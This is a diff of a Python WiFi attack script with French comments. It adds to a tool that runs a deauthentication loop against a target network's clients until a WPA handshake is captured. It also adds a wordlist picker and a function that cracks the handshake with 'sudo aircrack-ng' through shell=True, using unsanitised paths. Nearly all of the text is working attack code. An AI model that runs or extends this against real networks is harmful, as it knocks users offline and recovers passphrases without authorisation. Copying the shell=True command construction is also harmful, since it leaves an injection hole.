@@ -343,12 +343,11 @@ def capture_from_target_json_wpa(interface, target_path="Target/target.json", ou
             # Launch Paquet de Desauth vers tous ses appareils - Es ce que le Handshake a été capturé ? Si oui, passé a l'étape suivante
             monitor_for_handshake_and_attack(bssid, interface)
             
-            
                 
             # Arrêt du processus après la capture
             process.terminate()
             print("Processus de capture terminé.")
-
+            
     except FileNotFoundError:
         print(f"Erreur : Le fichier {target_path} n'existe pas.")
     except json.JSONDecodeError:
@@ -397,6 +396,7 @@ def check_handshake(capture_file):
         
         if "1 handshake" in result.stdout:
             print(f"[SUCCESS]: 1 Handshake détecté dans {capture_file}.")
+            time.sleep(2)
             return True
         else:
             print(f"[INFO]: Aucun handshake détecté dans {capture_file}.")
@@ -406,7 +406,7 @@ def check_handshake(capture_file):
         return False
     
     
-    
+# Boucle Desauth Handshake 
 def monitor_for_handshake_and_attack(bssid, interface):
     """
     Effectue une boucle qui exécute une attaque de deauth toutes les 30 secondes
@@ -423,6 +423,73 @@ def monitor_for_handshake_and_attack(bssid, interface):
         
         if check_handshake("Capture/capture_handshake-01.cap"):
             print("[SUCCESS]: Handshake capturé avec succès. Passage à l'étape suivante.")
+            time.sleep(2)
             break
         else:
             print("[INFO]: Aucun handshake détecté. Nouvelle tentative...")
+            
+
+# Liste les fichier du Dossier Wordlist      
+def list_and_choose_wordlist(wordlist_dir="Wordlist"):
+    """
+    Liste les fichiers de wordlists disponibles dans le dossier spécifié et permet à l'utilisateur d'en choisir un.
+
+    :param wordlist_dir: Le dossier contenant les fichiers de wordlists (par défaut "Wordlist").
+    :return: Le chemin complet vers la wordlist sélectionnée ou None si aucune sélection.
+    """
+    try:
+        # Vérification si le dossier existe
+        if not os.path.exists(wordlist_dir):
+            print(f"[ERROR]: Le dossier '{wordlist_dir}' n'existe pas.")
+            return None
+        
+        # Récupération des fichiers de wordlists
+        wordlists = [f for f in os.listdir(wordlist_dir) if os.path.isfile(os.path.join(wordlist_dir, f))]
+        if not wordlists:
+            print(f"[INFO]: Aucun fichier de wordlist trouvé dans '{wordlist_dir}'.")
+            return None
+
+        # Affichage des wordlists disponibles
+        print("[INFO]: Wordlists disponibles :")
+        for i, wordlist in enumerate(wordlists, start=1):
+            print(f"{i}. {wordlist}")
+        
+        # Sélection de la wordlist
+        choice = int(input("Entrez le numéro de la wordlist à utiliser : "))
+        if 1 <= choice <= len(wordlists):
+            selected_wordlist = os.path.join(wordlist_dir, wordlists[choice - 1])
+            print(f"[SUCCESS]: Wordlist sélectionnée : {selected_wordlist}")
+            return selected_wordlist
+        else:
+            print("[ERROR]: Choix invalide. Veuillez réessayer.")
+            return None
+    except ValueError:
+        print("[ERROR]: Entrée invalide. Veuillez entrer un numéro valide.")
+    except Exception as e:
+        print(f"[EXCEPTION]: Une erreur s'est produite : {e}")
+    return None
+
+
+# Crack le Handshake
+def crack_handshake_with_wordlist(wordlist_path ,capture_file="Capture/capture_handshake-01.cap"):
+    """
+    Tente de cracker un handshake WPA en utilisant une wordlist avec aircrack-ng.
+
+    :param capture_file: Le chemin vers le fichier de capture contenant le handshake (par défaut "Capture/capture_handshake-01.cap").
+    :param wordlist_path: Le chemin vers la wordlist à utiliser.
+    """
+    if not wordlist_path:
+        print("[ERROR]: Aucun chemin de wordlist fourni.")
+        return
+    
+    try:
+        command = f"sudo aircrack-ng -w {wordlist_path} {capture_file}"
+        result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        if result.returncode == 0:
+            print(f"[SUCCESS]: Tentative de craquage terminée.")
+            print(result.stdout)
+        else:
+            print(f"[ERROR]: Une erreur s'est produite lors de l'exécution.\n{result.stderr}")
+    except Exception as e:
+        print(f"[EXCEPTION]: Une erreur inattendue s'est produite : {e}")
